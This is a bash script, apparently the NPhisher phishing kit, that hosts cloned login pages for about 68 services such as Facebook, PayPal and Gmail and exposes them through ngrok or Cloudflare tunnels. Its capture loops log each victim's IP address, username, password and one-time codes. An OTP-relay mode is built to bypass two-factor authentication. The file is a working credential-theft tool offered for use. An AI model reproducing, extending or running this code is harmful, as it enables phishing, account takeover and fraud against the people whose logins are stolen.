
##COLOUR VARIABLES

#Text
RED="$(printf '\033[31m')" 
GREEN="$(printf '\033[32m')"  
ORANGE="$(printf '\033[33m')"  
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"  
WHITE="$(printf '\033[37m')" 
BLACK="$(printf '\033[30m')"
NC='\033[0m' #Reset colour
#Background
REDBG="$(printf '\033[41m')"  
GREENBG="$(printf '\033[42m')"  
ORANGEBG="$(printf '\033[43m')"  
BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  
CYANBG="$(printf '\033[46m')"  
WHITEBG="$(printf '\033[47m')" 
BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" #Reset background

#Directories
pro_dir=$(pwd)
server_dir="${pro_dir}/.server"
sites_dir="${pro_dir}/.sites"

#Normal Banner
banner(){
	echo " "
	echo -e "${RED} ██      ██╗${BLUE}██████╗${NC}"
	echo -e "${RED} ███╗    ██║${BLUE}██╔══██║ ${NC}"
	echo -e "${RED} ████╗   ██║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
	echo -e "${RED} ██╔██╗  ██║${BLUE}██████╔╝██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${NC}"
	echo -e "${RED} ██║ ╚██╗██║${BLUE}██╔═══╝ ███████║██║███████╗███████║█████╗  ██████╔╝${NC}"
	echo -e "${RED} ██║   ╚███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
	echo -e "${RED} ██║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
	echo -e "${RED} ╚═╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
	echo -e "${CYAN}        ${NC} "
}
# Credits banner
cbanner(){
	echo " "
	echo -e "${RED} ██      ██╗${BLUE}██████╗${NC}"
	echo -e "${RED} ███╗    ██║${BLUE}██╔══██║ ${NC}"
	echo -e "${RED} ████╗   ██║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
	echo -e "${RED} ██╔██╗  ██║${BLUE}██████╔╝██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${NC}"
	echo -e "${RED} ██║ ╚██╗██║${BLUE}██╔═══╝ ███████║██║███████╗███████║█████╗  ██████╔╝${NC}"
	echo -e "${RED} ██║   ╚███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
	echo -e "${RED} ██║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
	echo -e "${RED} ╚═╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
	echo -e "${CYAN}                                                  By - ${RED}RDXLR${NC}"
	echo -e "${CYAN}        ${NC} "
	echo -e "${GREEN}                           Version 1.0 ${NC}"
	echo -e "${CYAN}        ${NC} "
}
#Small Banner
sbanner(){
	echo " "
	echo -e "${RED} ▒█▄░ ▒█${BLUE} ▒█▀▀█ ${NC}"
	echo -e "${RED} ▒█▒█ ▒█${BLUE} ▒█▄▄█ █░░█ ░▀░ █▀▀ █░░█ █▀▀ █▀▀█${NC}"
	echo -e "${RED} ▒█░░█▒█${BLUE} ▒█░░░ █▀▀█ ▀█▀ ▀▀█ █▀▀█ █▀▀ █▄▄▀${NC}"
	echo -e "${RED} ▒█░░░██${BLUE} ▒█░░░ ▀░░▀ ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀ ▀░░▀${NC}"
	echo -e "${CYAN}        ${NC} "
}

## Directories
directories(){
if [[ ! -d ".server" ]]; then
        mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
        rm -rf ".server/www"
        mkdir -p ".server/www"
else
        mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
        rm -rf ".cld.log"
fi
}

#Dependencies
dependencies() {
        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

        if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Packages already installed."
        else
                pkgs=(php curl wget unzip)
                for pkg in "${pkgs[@]}"; do
                        type -p "$pkg" &>/dev/null || {
                                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
                                if [[ `command -v pkg` ]]; then
                                        pkg install "$pkg" -y
                                elif [[ `command -v apt` ]]; then
                                        apt install "$pkg" -y
                                elif [[ `command -v apt-get` ]]; then
                                        apt-get install "$pkg" -y
                                elif [[ `command -v pacman` ]]; then
                                        sudo pacman -S "$pkg" --noconfirm
                                elif [[ `command -v dnf` ]]; then
                                        sudo dnf -y install "$pkg"
                                else
                                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
                                        { reset_color; exit 1; }
                                fi
                        }
                done
        fi

}

## Reset terminal colors
reset_color() {
        tput sgr0   # reset attributes
        tput op     # reset color
    return
}

## Exit message
msg_exit() {
        { clear; banner; echo; }
        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
        { reset_color; exit 0; }
}

## Kill already running process
kill_pid() {
        if [[ `pidof php` ]]; then
                killall php > /dev/null 2>&1
        fi
        if [[ `pidof ngrok` ]]; then
                killall ngrok > /dev/null 2>&1
        fi
        if [[ `pidof cloudflared` ]]; then
                killall cloudflared > /dev/null 2>&1
        fi
}

#check whether execute permission is granted
xpermission(){
	if [[ -x "nphisher.sh" ]];then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
	else
	        chmod 777 nphisher.sh
	        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!" 
	fi
}

#check for updates
check_update() {
	rm -rf version.txt
	rm -rf core/update/tmp/version.txt
	
	wget --no-check-certificate https://raw.githubusercontent.com/RDXLR/NPhisher/main/core/update/version.txt > /dev/null 2>&1
	mv version.txt core/update/tmp
	
	current_ver=$( cat core/update/version.txt )
	lat_ver=$( cat core/update/tmp/version.txt )
	if [ $current_ver == $lat_ver ]; then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Your up to date!! ${NC} "
		{ sleep 3; clear; mainmenu; }
	else
		echo " "
		echo "${GREEN} Current version = ${YELLOW} $current_ver "
		echo "${GREEN} Latest version = ${YELLOW} $lat_ver "
		read -p "${GREEN}[${WHITE}#${GREEN}]${GREEN} Update found!! (Latest Version ${lat_ver} ) Do you want to update? (y/n) :"  ureply
		case $ureply in
			Y | y)
				update;;
			N | n)
				{ clear;  mainmenu; };;

		esac
	fi
}

update() {
	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} UPDATING ${NC}"
	mkdir $HOME/nphisher
	if [ -e .server/ngrok ]; then
		mv .server/ngrok $HOME/nphisher
	fi
	if [ -e .server/cloudflared ]; then
        	mv .server/cloudflared $HOME/nphisher
	fi

	cd ..
	rm -rf NPhisher
	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} REINSTALLING THE TOOL ${NC} "
	git clone https://github.com/RDXLR/NPhisher
	
	if [ -d NPhisher ]; then
		cd NPhisher
	        mv $HOME/nphisher/ngrok .server
	        mv $HOME/nphisher/cloudflared .server
	        rm -rf $HOME/nphisher
	        credits_banner
		echo " "
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${lat_ver} ) ${NC} "
	        sleep 0.3
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Now running the tool!! ${NC} "
	        sleep 2
	        bash nphisher.sh
		echo  " "
	else 
		echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED} SORRY, ERROR OCCURED!! TRY REINSTALLING MANUALLY!! ${NC} "
	fi

}

## Download Ngrok
download_ngrok() {
        url="$1"
        file=`basename $url`
        if [[ -e "$file" ]]; then
                rm -rf "$file"
        fi
        wget --no-check-certificate "$url" > /dev/null 2>&1
        if [[ -e "$file" ]]; then
                tar xvzf "$file" > /dev/null 2>&1
                mv -f ngrok .server > /dev/null 2>&1
                rm -rf "$file" > /dev/null 2>&1
                chmod +x .server/ngrok > /dev/null 2>&1
        else
                echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
                { reset_color; exit 1; }
        fi
}

## Download Cloudflared
download_cloudflared() {
        url="$1"
        file=`basename $url`
        if [[ -e "$file" ]]; then
                rm -rf "$file"
        fi
        wget --no-check-certificate "$url" > /dev/null 2>&1
        if [[ -e "$file" ]]; then
                mv -f "$file" .server/cloudflared > /dev/null 2>&1
                chmod +x .server/cloudflared > /dev/null 2>&1
        else
                echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
                { reset_color; exit 1; }
        fi
}

## Install ngrok
install_ngrok() {
        if [[ -e ".server/ngrok" ]]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok already installed."
        else
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing ngrok..."${WHITE}
                arch=`uname -m`
                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
                        download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.tgz'
                elif [[ "$arch" == *'aarch64'* ]]; then
                        download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.tgz'
                elif [[ "$arch" == *'x86_64'* ]]; then
                        download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz'
                else
                        download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.tgz'
                fi
        fi

}

## Install Cloudflared
install_cloudflared() {
        if [[ -e ".server/cloudflared" ]]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Cloudflared already installed."
        else
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
                arch=`uname -m`
                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
                        download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
                elif [[ "$arch" == *'aarch64'* ]]; then
                        download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
                elif [[ "$arch" == *'x86_64'* ]]; then
                        download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
                else
                        download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
                fi
        fi

}

##Ngrok token auth
ngrok_token_check(){
        if [ -s "${HOME}/.ngrok2/ngrok.yml" ]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok Authtoken setup is already done."
        else
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Setting up authtoken"
                ngrok_token_setup
        fi
}

ngrok_token_setup(){
        if [[ -d "${HOME}/.ngrok2/" ]]; then
               echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok2 directory exists!!"
        else
               mkdir $HOME/.ngrok2
               echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Created Ngrok2 directory "
        fi

        if [[ -s "${HOME}/.ngrok2/ngrok.yml" ]]; then
               rm -rf ${HOME}/.ngrok2/ngrok.yml
	       echo -e " "
               read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
               authline="authtoken : ${ntoken}"
               echo "$authline" >> ngrok.yml
               mv ngrok.yml ${HOME}/.ngrok2/
        else
               read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
               echo "authtoken : ${ntoken}" >> ngrok.yml
               mv ngrok.yml ${HOME}/.ngrok2/
        fi

}

## Setup website and start php server
HOST='127.0.0.1'
PORT='4444'
setup_site() {
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
        cp -rf .sites/"$website"/* .server/www
        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
        cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Start ngrok
start_ngrok() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        { sleep 1; setup_site; }
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

        { sleep 8; clear; banner; }
        ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
        echo -e "\n ${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN} $ngrok_url"
        capture_data_check
}

## Start Cloudflared
start_cloudflared() {
        rm .cld.log > /dev/null 2>&1 &
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        { sleep 1; setup_site; }
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
                sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

        { sleep 8; clear; banner; }

        cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}$cldflr_link"
        capture_data_check
}

## Start localhost
start_localhost() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        setup_site
        { sleep 1; clear; banner; }
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
        capture_data_check
}

## Get IP address
capture_ip() {
        IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
        IFS=$'\n'
        echo -e "\n${RED} Victim's IP : ${RED}$IP"
        echo -ne "\n${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/dumps/space.txt >> logs.dat
	cat .server/dumps/space.txt >> logs.dat
	cat .server/dumps/line.txt >> logs.dat
        cat .server/www/ip.txt >> logs.dat
	
}

#Capture data check
capture_data_check(){
	if [ -f .sites/$website/NOTP ];then
                capture_data_1
        elif [ -f .sites/$website/OOTP ];then
                capture_data_2
        elif [ -f .sites/$website/POTP ];then
                capture_data_3
	else 
		echo " Error Occured!!"
        fi

#no 1- id pass
# no 2 - id otp
# no 3 - id pass otp
} 

## Get credentials
capture_id() {
	echo "${RED}"
        cat .server/www/usernames.txt
        echo -e "\n ${GREEN} Saved in : ${ORANGE}logs.dat"
	cat .server/dumps/space.txt >> logs.dat
        cat .server/www/usernames.txt >> logs.dat
}

## Get credentials
capture_pass() {
	echo "${RED}"
	cat  .server/www/pass.txt
        echo -e "\n ${GREEN} Saved in : ${ORANGE}logs.dat"
	cat .server/dumps/space.txt >> logs.dat
        cat .server/www/pass.txt >> logs.dat
	
}

## Get otp
capture_otp() {
	echo "${RED}"
        cat  .server/www/otp.txt
        echo -e "\n ${GREEN} Saved in : ${ORANGE}logs.dat"
	cat .server/dumps/space.txt >> logs.dat
        cat .server/www/otp.txt >> logs.dat
}

## Print data no otp
capture_data_1() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                        rm -rf .server/www/ip.txt
                fi
                sleep 0.75
                if [[ -e ".server/www/usernames.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !"
                        capture_id
			capture_pass
                        rm -rf .server/www/usernames.txt
			rm -rf .server/www/pass.txt
			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
                fi
                sleep 0.75
	done
}

## Print data otp
capture_data_2() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                        rm -rf .server/www/ip.txt
                fi
                sleep 0.75
                if [[ -e ".server/www/usernames.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
                        capture_id
                        rm -rf .server/www/usernames.txt
			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for OTP>"
			echo -ne "\n${WHITE} NOTE : OTP WON'T BE SENT AUTOMATICALLY, ONCE YOU LOGIN IN OFFICAL WEBSITE, THAT OTP WILL BE SENT TO VICTIM"
                fi
		if [[ -e ".server/www/otp.txt" ]]; then
			echo -ne "\n\n${GREEN} OTP Found !"
                        capture_otp
                        rm -rf .server/www/otp.txt
			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
                fi
                sleep 0.75
	done
}

## Print data notp & otp
capture_data_3() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                        rm -rf .server/www/ip.txt
                fi
                sleep 0.75
                if [[ -e ".server/www/usernames.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!!"
                        capture_id
			capture_pass
			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for OTP>"
                        echo -ne "\n${WHITE} NOTE : OTP WON'T BE SENT AUTOMATICALLY, ONCE YOU LOGIN IN OFFICAL WEBSITE, THAT OTP WILL BE SENT TO VICTIM"
                        rm -rf .server/www/usernames.txt
			rm -rf .server/www/pass.txt
                fi
		if [[ -e ".server/www/otp.txt" ]]; then
			echo -ne "\n\n${GREEN} OTP Found !"
			capture_otp
			rm -rf .server/www/otp.txt
			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
		fi
                sleep 0.75
	done
}

## Tunnel selection
tunnel_menu() {
        { clear; banner; }
echo -e " "
echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Buggy${RED}]"
echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]"


        read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

        case $REPLY in
                1 | 01)
                        start_localhost;;
                2 | 02)
                        start_ngrok;;
                3 | 03)
                        start_cloudflared;;
                *)
0                       echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; tunnel_menu; };;
        esac
}

mainmenu() {
echo -e " "
echo -e " "
echo -e " "
banner
echo -e " "
echo -e " "
echo -e "${RED} CHOOSE A SITE : ${NC}"
echo -e " "
echo -e " "
echo -e "${BLUE} [1] ${GREEN} Adobe 	    	 ${NC}""${BLUE} [26] ${GREEN} Mediafire         ${NC}""${BLUE} [51] ${GREEN} Telenor           ${NC}"
echo -e "${BLUE} [2] ${GREEN} Airtel Sim 	 ${NC}""${BLUE} [27] ${GREEN} Messenger         ${NC}""${BLUE} [52] ${GREEN} Tiktok            ${NC}"
echo -e "${BLUE} [3] ${GREEN} AirtelXstream	 ${NC}""${BLUE} [28] ${GREEN} Microsoft         ${NC}""${BLUE} [53] ${GREEN} Twitch            ${NC}"
echo -e "${BLUE} [4] ${GREEN} Ajio 		 ${NC}""${BLUE} [29] ${GREEN} Mobikwik          ${NC}""${BLUE} [54] ${GREEN} Twitter           ${NC}"
echo -e "${BLUE} [5] ${GREEN} Amazon 		 ${NC}""${BLUE} [30] ${GREEN} Myspace           ${NC}""${BLUE} [55] ${GREEN} Ubereats          ${NC}"
echo -e "${BLUE} [6] ${GREEN} Apple 		 ${NC}""${BLUE} [31] ${GREEN} Netflix           ${NC}""${BLUE} [56] ${GREEN} verizon           ${NC}"
echo -e "${BLUE} [7] ${GREEN} Badoo 	         ${NC}""${BLUE} [32] ${GREEN} Ola               ${NC}""${BLUE} [57] ${GREEN} VI                ${NC}"
echo -e "${BLUE} [8] ${GREEN} Clash of Clans	 ${NC}""${BLUE} [33] ${GREEN} Origin            ${NC}""${BLUE} [58] ${GREEN} VK                ${NC}"
echo -e "${BLUE} [9] ${GREEN} Date 		 ${NC}""${BLUE} [34] ${GREEN} Paypal            ${NC}""${BLUE} [59] ${GREEN} Whatsapp          ${NC}"
echo -e "${BLUE} [10] ${GREEN} Devianart 	 ${NC}""${BLUE} [35] ${GREEN} Paytm             ${NC}""${BLUE} [60] ${GREEN} Wordpress         ${NC}"
echo -e "${BLUE} [11] ${GREEN} DropBox 		 ${NC}""${BLUE} [36] ${GREEN} Phonepay          ${NC}""${BLUE} [61] ${GREEN} Xbox              ${NC}"
echo -e "${BLUE} [12] ${GREEN} Ebay 		 ${NC}""${BLUE} [37] ${GREEN} Pinterest         ${NC}""${BLUE} [62] ${GREEN} Yahoo             ${NC}"
echo -e "${BLUE} [13] ${GREEN} Facebook 	 ${NC}""${BLUE} [38] ${GREEN} Playstation       ${NC}""${BLUE} [63] ${GREEN} Yandex            ${NC}"
echo -e "${BLUE} [14] ${GREEN} Flipcart 	 ${NC}""${BLUE} [39] ${GREEN} ProtonMail        ${NC}""${BLUE} [64] ${GREEN} Youtube Subs      ${NC}"
echo -e "${BLUE} [15] ${GREEN} Freefire 	 ${NC}""${BLUE} [40] ${GREEN} Pubg              ${NC}""${BLUE} [65] ${GREEN} Discord           ${NC}"
echo -e "${BLUE} [16] ${GREEN} Github 		 ${NC}""${BLUE} [41] ${GREEN} Quora             ${NC}""${BLUE} [66] ${GREEN} Jio router        ${NC}"
echo -e "${BLUE} [17] ${GREEN} Gitlab 		 ${NC}""${BLUE} [42] ${GREEN} Reddit            ${NC}""${BLUE} [67] ${GREEN} Google WIFI       ${NC}"
echo -e "${BLUE} [18] ${GREEN} Gmail		 ${NC}""${BLUE} [43] ${GREEN} Shopify           ${NC}""${BLUE} [68] ${ORANGE} Mobile Pattern    ${NC}"
echo -e "${BLUE} [19] ${GREEN} Google 		 ${NC}""${BLUE} [44] ${GREEN} Snapchat          ${NC}"
echo -e "${BLUE} [20] ${GREEN} Gpay 	   	 ${NC}""${BLUE} [45] ${GREEN} Socialclub        ${NC}"
echo -e "${BLUE} [21] ${GREEN} icloud 		 ${NC}""${BLUE} [46] ${GREEN} Spotify           ${NC}"
echo -e "${BLUE} [22] ${GREEN} Instagram 	 ${NC}""${BLUE} [47] ${GREEN} Stackoverflow     ${NC}"
echo -e "${BLUE} [23] ${GREEN} Jazz		 ${NC}""${BLUE} [48] ${GREEN} Steam             ${NC}"
echo -e "${BLUE} [24] ${GREEN} Jio 		 ${NC}""${BLUE} [49] ${GREEN} Subitout          ${NC}"
echo -e "${BLUE} [25] ${GREEN} Linkedin 	 ${NC}""${BLUE} [50] ${GREEN} Telegram          ${NC}"
echo -e " "
echo -e "${BLUE} [A] ${RED} About              ${NC}""${BLUE} [B] ${RED} Request A site      ${NC}""${BLUE} [C] ${RED} Report an Issue        ${NC}"
echo -e "${BLUE} [D] ${RED} View Logs          ${NC}""${BLUE} [E] ${RED} Check for Updates   ${NC}""${BLUE} [00] ${RED} Exit                  ${NC}"
echo -e " "
read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" reply
echo " "
case $reply in
        1 | 01)
                site_adobe;;
        2 | 02)
                website="airtelsim"
		tunnel_menu;;
	3 | 03)
                site_airtelxstream;;
	4 | 04) 
		site_ajio;;
	5 | 05)
                site_amazon;;
        6 | 06)
                site_apple;;
	7 | 07)
                site_badoo;;
        8 | 08)
                website="clashofclans"
		tunnel_menu;;
	9 | 09)
                site_date;;
        10)
                site_devianart;;
	11)
                website="dropbox"
                tunnel_menu;;
	12)
                site_ebay;;
        13)
                site_facebook;;
	14)
                site_flipcart;;
	15)
                website="freefire"
                tunnel_menu;;
        16)
                site_github;;
	17)
                site_gitlab;;
	18)
                site_gmail;;
        19)
                site_google;;
	20)
		site_gpay;;
	21)
                website="icloud"
                tunnel_menu;;
	22)
                site_instagram;;
	23)
                website="jazz"
                tunnel_menu;;
        24)
                site_jio;;
        25)
                site_linkedin;;
        26)
                site_mediafire;;
	27)
                site_messenger;;
	28)
                site_microsoft;;
	29)
                website="mobikwik"
                tunnel_menu;;
	30)
                site_myspace;;
	31)
                site_netflix;;
	32)
                website="ola"
                tunnel_menu;;
	33)
                website="origin"
                tunnel_menu;;
	34)
                site_paypal;;
	35)
                site_paytm;;
	36)
                website="phonepay"
                tunnel_menu;;
	37)
                website="pinterest"
                tunnel_menu;;
	38)
		site_playstation;;
	39)
                site_protonmail;;
	40)
                website="pubg"
                tunnel_menu;;
	41)
                website="quora"
                tunnel_menu;;
	42)
                site_reddit;;
	43)
                site_shopify;;
	44)
                site_snapchat;;
	45)
                site_socialclub;;
	46)
                site_spotify;;
	47)
                site_stackoverflow;;
	48)
                site_steam;;
	49)
                website="subitoit"
                tunnel_menu;;
	50)
                website="telegram"
                tunnel_menu;;
	51)
                website="telenor"
                tunnel_menu;;
	52)
                site_tiktok;;
        53)
                site_twitch;;
	54)
                site_twitter;;
        55)
                site_ubereats;;
	56)
                site_verizon;;
        57)
                website="visim"
                tunnel_menu;;
	58)
                site_vk;;
        59)
                website="whatsapp"
                tunnel_menu;;
	60)
                site_wordpress;;
        61)
                site_xbox;;
	62)
                site_yahoo;;
        63)
                site_yandex;;
	64)
                site_ytsubs;;
	65)
		site_discord;;
	66)
		site_jiorouter;;
	67)
		website="google_wifi"
		tunnel_menu;;
	68)
		website="pattern"
		tunnel_menu;;
	A | a)
		xdg-open https://github.com/RDXLR/NPhisher
		{ sleep 2; clear;  banner; mainmenu; };;
	B | b | C | c)
		xdg-open https://github.com/RDXLR/NPhisher/issues/new
		{ sleep 2; clear; banner; mainmenu; };;
	D | d)
		if [ -f logs.dat ];then
			cat logs.dat
		else 
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} No logs data found!!"
			{ sleep 2; clear; mainmenu; }
		fi;;
	E | e)
		check_update;;
	0 | 00)
		msg_exit;;
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; clear; mainmenu; };;
esac


}



#WEBSITES
#adobe
site_adobe(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
	1 | 01) 
		website="adobe"
		tunnel_menu;;
	2 | 02)
                website="adobe/otp"
                tunnel_menu;;
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_adobe; };;
esac
}
#airtelxstream
site_airtelxstream(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="airtelxstream"
                tunnel_menu;;
        2 | 02)
                website="airtelxstream/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_airtelxstream; };;
esac
}
#ajio
site_ajio(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="ajio"
                tunnel_menu;;
        2 | 02)
                website="ajio/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
